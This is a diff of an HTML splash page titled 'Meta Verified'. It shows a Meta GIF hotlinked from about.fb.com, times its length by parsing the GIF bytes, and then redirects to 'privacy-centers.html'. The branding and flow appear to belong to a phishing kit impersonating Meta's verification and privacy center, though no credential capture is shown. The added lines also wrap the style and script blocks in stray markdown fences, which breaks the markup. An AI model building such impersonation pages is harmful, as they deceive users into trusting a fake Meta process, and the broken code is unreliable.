@@ -1,42 +1,83 @@
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meta Verified</title>
-    <style>
-        html, body {
-            margin: 0;
-            padding: 0;
+    <link rel="icon" href="./public/favicon-32x32.png">
+
+```
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    html, body {
+        width: 100%;
+        height: 100%;
+        background: #000;
+        overflow: hidden;
+    }
+
+    img#introGif {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+
+        width: 100vw;
+        height: 100vh;
+
+        object-fit: cover;
+    }
+
+    /* 📱 Mobile tối ưu hiển thị */
+    @media (max-width: 768px) {
+        img#introGif {
+            object-fit: contain; /* không bị cắt */
             background: #000;
-            overflow: hidden;
         }
-        video {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-    </style>
+    }
+</style>
+```
+
 </head>
+
 <body>
+    <img id="introGif" 
+         src="https://about.fb.com/wp-content/uploads/2021/10/06_211025_CompanyEC_16x9__30fps__1080-1.gif" 
+         alt="intro">
 
-<video id="introVideo" autoplay muted playsinline>
-    <source src="intro.mp4" type="video/mp4">
-</video>
-
+```
 <script>
-    const video = document.getElementById('introVideo');
+    async function getGifDuration(url) {
+        try {
+            const res = await fetch(url);
+            const buf = await res.arrayBuffer();
+            const bytes = new Uint8Array(buf);
 
-    // Khi video chạy xong → chuyển trang
-    video.addEventListener('ended', () => {
-        window.location.href = 'privacy-centers.html';
-    });
+            let duration = 0;
 
-    // Nếu muốn bật tiếng (trên máy tính)
-    video.muted = false;
+            for (let i = 0; i < bytes.length - 3; i++) {
+                if (bytes[i] === 0x21 && bytes[i+1] === 0xF9 && bytes[i+2] === 0x04) {
+                    const delay = (bytes[i+4] + bytes[i+5] * 256) * 10;
+                    duration += delay;
+                }
+            }
+
+            return duration > 0 ? duration : 10000;
+        } catch(e) {
+            return 10000;
+        }
+    }
+
+    getGifDuration('https://about.fb.com/wp-content/uploads/2021/10/06_211025_CompanyEC_16x9__30fps__1080-1.gif')
+        .then(ms => {
+            setTimeout(() => {
+                window.location.href = 'privacy-centers.html';
+            }, ms);
+        });
 </script>
+```
 
 </body>
 </html>
